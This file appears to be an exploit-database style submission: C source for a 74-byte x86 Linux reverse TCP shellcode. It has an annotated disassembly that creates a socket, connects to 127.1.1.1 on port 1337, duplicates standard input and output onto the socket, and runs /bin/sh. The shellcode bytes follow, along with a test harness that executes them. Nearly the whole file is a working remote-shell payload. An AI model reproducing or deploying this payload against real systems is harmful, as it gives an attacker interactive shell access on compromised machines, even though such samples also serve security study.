#include <stdio.h>

/*
reverse tcp execve /bin/sh --  74 Bytes -- 1FEB2017 -- icon

sys_socketcall open new fd - 16 bytes
0:  31 db                   xor    ebx,ebx
2:  53                      push   ebx
3:  89 da                   mov    edx,ebx
5:  43                      inc    ebx
6:  53                      push   ebx
7:  6a 02                   push   0x2
9:  89 e1                   mov    ecx,esp
b:  6a 66                   push   0x66
d:  58                      pop    eax
e:  cd 80                   int    0x80

sys_socketcall connect to 127.1.1.1:1337 - 23 bytes
10: 92                      xchg   edx,eax
11: b0 66                   mov    al,0x66
13: 68 7f 01 01 01          push   0x101017f
18: 66 68 05 39             pushw  0x3905
1c: 43                      inc    ebx
1d: 66 53                   push   bx
1f: 43                      inc    ebx
20: 89 e1                   mov    ecx,esp
22: 6a 10                   push   0x10
24: 51                      push   ecx
25: 52                      push   edx
26: 89 e1                   mov    ecx,esp
28: cd 80                   int    0x80

dup2 stdin, stdout, stderr to sock_fd 12 bytes
2a: 6a 02                   push   0x2
2c: 59                      pop    ecx
2d: 89 da                   mov    edx,ebx
2f: b0 3f                   mov    al,0x3f
31: cd 80                   int    0x80
33: 49                      dec    ecx
34: 79 f9                   jns    0x2f

execve /bin//sh 20 bytes
36: b0 0b                   mov    al,0xb
38: 41                      inc    ecx
39: 89 ca                   mov    edx,ecx
3b: 52                      push   edx
3c: 68 2f 2f 73 68          push   0x68732f2f
41: 68 2f 62 69 6e          push   0x6e69622f
46: 89 e3                   mov    ebx,esp
48: cd 80                   int    0x80
*/

char rev_tcp[] =
"\x31\xDB\x53\x89\xDA\x43\x53\x6A\x02\x89\xE1\x6A\x66\x58\xCD\x80"
"\x92\xB0\x66\x68\x7F\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x43\x89\xE1\x6A\x10\x51\x52\x89\xE1\xCD\x80"
"\x6A\x02\x59\x89\xDA\xB0\x3F\xCD\x80\x49\x79\xF9"
"\xB0\x0B\x41\x89\xCA\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80";

int main(int argc, char **argv){
  asm("mov eax, 0x20; mov ebx, eax; mov ecx, eax; mov edx, eax;");
  int (*test)() = (int(*)())rev_tcp;
  test();
}
